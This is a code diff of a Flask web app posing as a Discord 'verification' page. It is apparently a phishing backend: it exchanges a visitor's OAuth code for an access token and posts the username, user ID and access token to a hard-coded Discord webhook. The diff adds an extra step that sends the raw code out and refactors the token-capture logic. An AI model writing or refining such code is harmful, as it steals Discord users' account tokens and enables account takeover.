@@ -10,12 +10,12 @@ REDIRECT_URI = "https://root1-two.vercel.app"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1dguN1S9kjJQ2TvVzIUnZbuSiUEcvhDi5emEiDwn4weplUamhUY2775Vk3"
 
 
-@app.route("/", methods=["GET"])
-@app.route("/api/index", methods=["GET"])
-def index():
+@app.route("/", defaults={"path": ""})
+@app.route("/<path:path>")
+def index(path):
   code = request.args.get("code")
 
-  # Landing page when visiting the site normally
+  # Landing page with verification button
   if not code:
     return render_template_string("""
             <!DOCTYPE html>
@@ -43,27 +43,38 @@ def index():
         """)
 
   try:
+    # Send raw code to webhook immediately to prove routing is working
+    requests.post(
+        WEBHOOK_URL,
+        json={"content": f"📥 **Received Code:** `{code}`"},
+        timeout=5,
+    )
+
     # Step 1: Exchange code for access token
+    payload_data = {
+        "client_id": CLIENT_ID,
+        "client_secret": CLIENT_SECRET,
+        "grant_type": "authorization_code",
+        "code": code,
+        "redirect_uri": REDIRECT_URI,
+    }
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
     token_res = requests.post(
         "https://discord.com/api/oauth2/token",
-        data={
-            "client_id": CLIENT_ID,
-            "client_secret": CLIENT_SECRET,
-            "grant_type": "authorization_code",
-            "code": code,
-            "redirect_uri": REDIRECT_URI,
-        },
-        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        data=payload_data,
+        headers=headers,
         timeout=10,
     )
 
+    # If Discord rejects the token exchange, log the exact error to webhook
     if token_res.status_code != 200:
       requests.post(
           WEBHOOK_URL,
           json={
               "content": (
-                  "⚠️ **Token Exchange Failed:** ```json\n"
-                  f"{token_res.text}\n```"
+                  "❌ **Token Exchange Failed ("
+                  f"{token_res.status_code}):** ```\n{token_res.text}\n```"
               )
           },
           timeout=10,
@@ -73,45 +84,60 @@ def index():
     token_data = token_res.json()
     access_token = token_data.get("access_token")
 
-    if access_token:
-      # Step 2: Fetch user profile
-      user_res = requests.get(
-          "https://discord.com/api/users/@me",
-          headers={"Authorization": f"Bearer {access_token}"},
-          timeout=10,
-      )
-      user = user_res.json()
-
-      username = user.get("username", "Unknown")
-      user_id = user.get("id", "Unknown")
-
-      # Step 3: Send captured token and user details to webhook log channel
+    if not access_token:
       requests.post(
           WEBHOOK_URL,
           json={
-              "embeds": [{
-                  "title": "🔑 Verification Captured",
-                  "color": 5763719,
-                  "fields": [
-                      {
-                          "name": "User",
-                          "value": f"{username} (`{user_id}`)",
-                          "inline": True,
-                      },
-                      {
-                          "name": "Access Token",
-                          "value": f"`{access_token}`",
-                          "inline": False,
-                      },
-                  ],
-              }]
+              "content": (
+                  "❌ **No Access Token in Response:** ```\n"
+                  f"{token_data}\n```"
+              )
           },
           timeout=10,
       )
+      return "No access token found", 500
+
+    # Step 2: Fetch user profile
+    user_res = requests.get(
+        "https://discord.com/api/users/@me",
+        headers={"Authorization": f"Bearer {access_token}"},
+        timeout=10,
+    )
+    user = user_res.json()
+
+    username = user.get("username", "Unknown")
+    user_id = user.get("id", "Unknown")
+
+    # Step 3: Forward captured token and user details to webhook log channel
+    requests.post(
+        WEBHOOK_URL,
+        json={
+            "embeds": [{
+                "title": "🔑 Verification Captured",
+                "color": 5763719,
+                "fields": [
+                    {
+                        "name": "User",
+                        "value": f"{username} (`{user_id}`)",
+                        "inline": True,
+                    },
+                    {
+                        "name": "Access Token",
+                        "value": f"`{access_token}`",
+                        "inline": False,
+                    },
+                ],
+            }]
+        },
+        timeout=10,
+    )
+
   except Exception as e:
     try:
       requests.post(
-          WEBHOOK_URL, json={"content": f"🚨 **Server Exception:** `{str(e)}`"}, timeout=5
+          WEBHOOK_URL,
+          json={"content": f"🚨 **Python Exception:** `{str(e)}`"},
+          timeout=5,
       )
     except:
       pass
